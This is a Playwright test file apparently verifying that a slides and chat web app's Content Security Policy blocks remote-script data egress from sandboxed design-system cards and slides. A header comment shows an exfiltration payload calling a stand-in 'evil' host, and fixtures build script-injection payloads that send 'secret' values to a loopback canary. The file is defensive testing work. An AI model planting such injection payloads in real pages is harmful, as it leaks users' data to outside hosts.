// md-exfil T11 (ADR-9): the enforced CSP carries `default-src 'self'` and
// `script-src 'self' 'unsafe-inline'`. A script that runs inside a srcdoc frame
// (a design-system card, or a deck slide if the sanitizer were ever bypassed)
// can no longer load a remote script, which is a no-click egress channel
// (`<script src=https://evil/x.js?d=<data>>`). The "attacker host" is a
// loopback listener this spec starts and stops; it COUNTS requests. Under
// CSP_EGRESS=report (a second fixture server, same build) the canary IS hit.
// Own file on purpose: T7 edits egress.spec.mjs / csp-report-only.spec.mjs.
import http from 'node:http'
import { test, expect } from '@playwright/test'
import { loadFixtures, newVariantContext, SCREENS } from './lib.mjs'
import { startFixtureServer } from './fixture-server.mjs'

const fx = loadFixtures()
const { ids } = fx

// every frame reports its securitypolicyviolation events to the top window; a sandboxed srcdoc frame has an
// opaque origin, so it can only reach the top through postMessage
const VIOLATION_PROBE = `(() => {
  const sink = (v) => { (window.__cspV = window.__cspV || []).push(v) }
  if (window === window.top) window.addEventListener('message', (e) => { if (e.data && e.data.__t11csp) sink(e.data.v) })
  document.addEventListener('securitypolicyviolation', (e) => {
    const v = { directive: e.effectiveDirective, disposition: e.disposition }
    if (window === window.top) sink(v)
    else window.top.postMessage({ __t11csp: 1, v }, '*')
  }, true)
})()`

async function startCapture() {
  const hits = []
  const server = http.createServer((req, res) => {
    hits.push(req.url)
    res.writeHead(200, {
      'content-type': 'text/javascript',
      'access-control-allow-origin': '*',
    })
    res.end('window.__remoteScriptRan = 1')
  })
  await new Promise((r) => server.listen(0, '127.0.0.1', r))
  return {
    hits,
    port: server.address().port,
    close: () => new Promise((r) => (server.close(() => r()), server.closeAllConnections())),
  }
}

// a DS card whose inline script injects a remote <script> (what an uploaded kit can do)
const dsCard = (port) =>
  '<section style="width:1280px;height:720px;background:#123;color:#fff;font:600 64px system-ui;padding:80px">' +
  '<span id="ds-probe">Specimen slide</span>' +
  `<script>var s=document.createElement("script");s.src="http://127.0.0.1:${port}/ds.js?d=secret";document.body.appendChild(s);document.getElementById("ds-probe").dataset.ran="1"</script></section>`

// a slide that carries the same payload as a static tag: what a sanitizer bypass would leave in the stored HTML
const slideHtml = (port, i) =>
  `<section style="width:1280px;height:720px;background:#0B2026;color:#fff;padding:96px;box-sizing:border-box"><h1 id="t11-title">Revenue grew ${i}</h1><script src="http://127.0.0.1:${port}/slide.js?d=slide-secret"></script></section>`

async function openOn(browser, base) {
  const ctx = await newVariantContext(browser, {
    theme: 'dark',
    mobile: false,
  })
  await ctx.addInitScript(VIOLATION_PROBE)
  const page = await ctx.newPage()
  const errors = []
  page.on('pageerror', (e) => errors.push(String(e)))
  // no recorded fixture for the template list: an empty one (showDsCard registers its own, which wins)
  await page.route('**/api/deck-templates', (r) =>
    r.fulfill({
      contentType: 'application/json',
      body: JSON.stringify({ templates: [] }),
    })
  )
  return { ctx, page, errors, base }
}

async function showDsCard(page, base, port) {
  await page.route('**/api/deck-templates', (route) =>
    route.fulfill({
      contentType: 'application/json',
      body: JSON.stringify({
        templates: [
          {
            id: 501,
            name: 'Probe DS',
            scope: 'user',
            dsCards: [{ group: 'Templates', html: dsCard(port) }],
            primaryColor: '#123',
          },
        ],
      }),
    })
  )
  await page.goto(`${base}/#/chat`)
  await page.locator('textarea').first().waitFor()
  await page.locator('button[title="Settings"]').first().click()
  await page.getByRole('button', { name: 'Design system', exact: true }).first().click()
  const frame = page.frameLocator('iframe[title="Probe DS"]')
  await expect(frame.getByText('Specimen slide')).toBeVisible({
    timeout: 15_000,
  })
  // the card's own inline script ran (inline stays allowed)
  await expect(frame.locator('#ds-probe')).toHaveAttribute('data-ran', '1')
}

async function showSlide(page, base, port) {
  const deck = JSON.parse(fx.routes['GET /api/decks/9'].body)
  deck.deck.slides = deck.deck.slides.map((_, i) => slideHtml(port, i))
  await page.route('**/api/decks/9', (r) => r.fulfill({ contentType: 'application/json', body: JSON.stringify(deck) }))
  const msgs = JSON.parse(fx.routes[`GET /api/sessions/${ids.s1}/messages`].body)
  for (const m of msgs.messages) for (const b of m.blocks || []) if (b.type === 'deck-html') b.slides = b.slides.map((_, i) => slideHtml(port, i))
  await page.route(`**/api/sessions/${ids.s1}/messages`, (r) => r.fulfill({ contentType: 'application/json', body: JSON.stringify(msgs) }))
  await SCREENS['deck-studio'](page, base, ids)
  await expect
    .poll(
      async () => {
        for (const f of page.frames())
          if (
            f !== page.mainFrame() &&
            (await f
              .locator('#t11-title')
              .count()
              .catch(() => 0))
          )
            return true
        return false
      },
      { timeout: 15_000 }
    )
    .toBe(true)
}

const scriptViolations = (page, disposition) => page.evaluate((d) => (window.__cspV || []).filter((v) => v.directive.startsWith('script-src') && v.disposition === d), disposition)

test('S1 (header): enforce carries default-src and script-src with no origin, blob:, unsafe-eval or *', async ({ request, baseURL }) => {
  const csp = (await request.get(`${baseURL}/`)).headers()['content-security-policy']
  expect(csp).toContain("default-src 'self'; script-src 'self' 'unsafe-inline'; img-src")
  // the fixture server runs with an admin-allowlisted origin: it opens img/font/style only
  expect(csp).toMatch(/img-src[^;]*cdn\.allowed\.example/)
  for (const d of ['default-src', 'script-src']) expect(csp.match(new RegExp(`(?:^|; )${d} ([^;]*)`))[1]).not.toMatch(/https?:|blob:|unsafe-eval|\*|allowed\.example/)
})

test('S2 (DS card): an inline script that injects a remote <script> gets 0 hits and a script-src violation', async ({ browser, baseURL }) => {
  const cap = await startCapture()
  const { ctx, page, errors } = await openOn(browser, baseURL)
  try {
    await showDsCard(page, baseURL, cap.port)
    await expect.poll(() => scriptViolations(page, 'enforce'), { timeout: 10_000 }).not.toEqual([])
    expect(cap.hits).toEqual([])
    // the block is reported through the browser's own event (above); delivery to /api/csp-report is the Reporting API's
    // batching, which headless Chromium does not flush within a test's time, so the wiring is asserted on the header instead
    const h = (await page.request.get(baseURL + '/')).headers()
    expect(h['content-security-policy']).toContain('report-uri /api/csp-report; report-to csp-endpoint')
    expect(h['reporting-endpoints']).toContain('csp-endpoint=')
    expect(errors).toEqual([])
  } finally {
    await ctx.close()
    await cap.close()
  }
})

test('S2 (slide, sanitizer bypassed): a stored <script src> in a slide gets 0 hits and a script-src violation', async ({ browser, baseURL }) => {
  const cap = await startCapture()
  const { ctx, page } = await openOn(browser, baseURL)
  try {
    await showSlide(page, baseURL, cap.port)
    await expect.poll(() => scriptViolations(page, 'enforce'), { timeout: 10_000 }).not.toEqual([])
    expect(cap.hits).toEqual([])
  } finally {
    await ctx.close()
    await cap.close()
  }
})

test('S2 (CSP_EGRESS=report): the same DS card and slide DO reach the canary, and nothing is enforced', async ({ browser }) => {
  const prev = process.env.CSP_EGRESS
  process.env.CSP_EGRESS = 'report' // read once when the header middleware is built
  const rep = await startFixtureServer({ port: 0 })
  if (prev === undefined) delete process.env.CSP_EGRESS
  else process.env.CSP_EGRESS = prev
  const cap = await startCapture()
  try {
    const csp = (await (await fetch(`${rep.url}/`)).headers.get('content-security-policy')) || ''
    expect(csp).not.toMatch(/default-src|script-src/)

    const a = await openOn(browser, rep.url)
    await showDsCard(a.page, rep.url, cap.port)
    await expect
      .poll(() => cap.hits.filter((u) => u.startsWith('/ds.js')).length, {
        timeout: 10_000,
      })
      .toBeGreaterThanOrEqual(1)
    expect(await scriptViolations(a.page, 'enforce')).toEqual([])
    await a.ctx.close()

    const b = await openOn(browser, rep.url)
    await showSlide(b.page, rep.url, cap.port)
    await expect
      .poll(() => cap.hits.filter((u) => u.startsWith('/slide.js')).length, {
        timeout: 10_000,
      })
      .toBeGreaterThanOrEqual(1)
    expect(await scriptViolations(b.page, 'enforce')).toEqual([])
    await b.ctx.close()
  } finally {
    await rep.close()
    await cap.close()
  }
})

// S3/S4: every surface is checked ON ITS OWN, before the next navigation replaces the page's event buffer
const enforced = (page) => page.evaluate(() => (window.__cspV || []).filter((v) => v.disposition === 'enforce'))
async function noEnforced(page, surface) {
  await page.waitForTimeout(400) // violations are queued events: let them land
  expect(await enforced(page), `${surface}: no enforced CSP violation`).toEqual([])
}

const mcpMessages = () => {
  const body = JSON.parse(fx.routes[`GET /api/sessions/${ids.s3}/messages`].body)
  const model = JSON.parse(fx.routes[`GET /api/sessions/${ids.s1}/messages`].body).messages[1].model
  body.messages = [
    body.messages[0],
    {
      id: '910',
      role: 'assistant',
      content: 'Here is the chart.\n\n{{toolcall:c1}}',
      attachments: null,
      model,
      prompt_tokens: 1,
      completion_tokens: 1,
      blocks: null,
      tool_calls: [
        {
          id: 'c1',
          name: 'mcp_chart__show_chart',
          label: 'Chart',
          args: { series: 'a' },
          status: 'ok',
          durationMs: 1,
          result: 'chart ready',
          hasUi: true,
          uiServiceName: 'main.apps.chart',
          uiToolCallId: '501',
          uiCsp: {
            connectDomains: ['https://api.example.com'],
            resourceDomains: [],
            frameDomains: [],
            baseUriDomains: [],
          },
        },
      ],
      created_at: '2026-11-22T07:09:00.000Z',
      media_processing: null,
      intent_classify: null,
      reasoning: null,
    },
  ]
  return body
}

test('S3/S4: the built shell, deck studio, editor, present, .pptx export, DS settings and inspector and an MCP App each raise 0 enforced violations', async ({ browser, baseURL }) => {
  const { ctx, page, errors } = await openOn(browser, baseURL)
  try {
    const exported = { body: null }
    await page.route(`**/api/decks/${ids.deck}/export-html`, (r) => {
      exported.body = r.request().postData() || ''
      return r.fulfill({
        status: 200,
        contentType: 'application/octet-stream',
        body: Buffer.from('PK'),
      })
    })
    // the built shell
    await page.goto(`${baseURL}/#/chat`)
    await page.locator('textarea').first().waitFor()
    await noEnforced(page, 'shell')
    // deck studio (chat card thumbnail, then the studio preview)
    await page.goto(`${baseURL}/#/chat/${ids.s1}`)
    const open = page.getByText('Open in Slides Studio').first()
    await open.waitFor()
    await noEnforced(page, 'chat deck card')
    await open.scrollIntoViewIfNeeded()
    await open.click()
    await page.locator('iframe').first().waitFor()
    await page.waitForTimeout(1500)
    await noEnforced(page, 'deck studio')
    // editor: its inline runtime must run (the element tree arrives over postMessage)
    await page.getByTitle('Edit the slide directly: click any element to adjust it').click()
    await page.getByRole('tab', { name: 'Layers' }).click()
    await expect(page.getByText('Elements').first()).toBeVisible()
    await noEnforced(page, 'editor')
    // present
    await page
      .getByRole('button', { name: /Present/ })
      .first()
      .click()
    await expect(page.getByRole('dialog').last().frameLocator('iframe').first().locator('section').first()).toBeVisible({ timeout: 15_000 })
    await noEnforced(page, 'present')
    await page.keyboard.press('Escape')
    // .pptx export renders every slide in its hidden frame
    await page.getByRole('button', { name: 'Export', exact: true }).click()
    await page.getByRole('menuitem', { name: /Universal fonts/ }).click()
    await expect.poll(() => exported.body, { timeout: 15_000 }).not.toBeNull()
    await noEnforced(page, '.pptx export')
    // DS settings and the inspector (benign card with an inline script that runs)
    await page.route('**/api/deck-templates', (route) =>
      route.fulfill({
        contentType: 'application/json',
        body: JSON.stringify({
          templates: [
            {
              id: 501,
              name: 'Probe DS',
              scope: 'user',
              dsCards: [
                {
                  group: 'Templates',
                  html: '<section style="width:1280px;height:720px;background:#123;color:#fff"><span id="ds-probe">Specimen slide</span><script>document.getElementById("ds-probe").dataset.ran="1"</script></section>',
                },
              ],
              primaryColor: '#123',
            },
          ],
        }),
      })
    )
    await page.goto(`${baseURL}/#/chat`)
    await page.locator('textarea').first().waitFor()
    await page.locator('button[title="Settings"]').first().click()
    await page.getByRole('button', { name: 'Design system', exact: true }).first().click()
    const card = page.frameLocator('iframe[title="Probe DS"]')
    await expect(card.locator('#ds-probe')).toHaveAttribute('data-ran', '1', {
      timeout: 15_000,
    })
    await noEnforced(page, 'DS settings')
    // the inspector loads the full template by id
    await page.route('**/api/deck-templates/501', (r) => r.fulfill({ json: { template: { id: 501, name: 'Probe DS', scope: 'user', canEdit: true, dsCards: [], primaryColor: '#123' } } }))
    await page.getByRole('button', { name: 'Inspect design system' }).first().click()
    await expect(page.getByRole('dialog').last()).toBeVisible()
    await page.waitForTimeout(1500)
    await noEnforced(page, 'DS inspector')
    await page.keyboard.press('Escape')
    // an MCP App View (zod must not probe eval: jitless), on its own page
    const mp = await ctx.newPage()
    await mp.route('**/api/deck-templates', (r) =>
      r.fulfill({
        contentType: 'application/json',
        body: JSON.stringify({ templates: [] }),
      })
    )
    await mp.route(`**/api/sessions/${ids.s3}/messages`, (r) =>
      r.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify(mcpMessages()),
      })
    )
    await mp.goto(`${baseURL}/#/chat/${ids.s3}`)
    await mp
      .getByRole('button', { name: /Open app/i })
      .first()
      .click()
    await expect(mp.frameLocator('iframe[data-mcp-app]').locator('#status')).toHaveText('ready')
    await noEnforced(mp, 'MCP App')
    expect(errors).toEqual([])
  } finally {
    await ctx.close()
  }
})
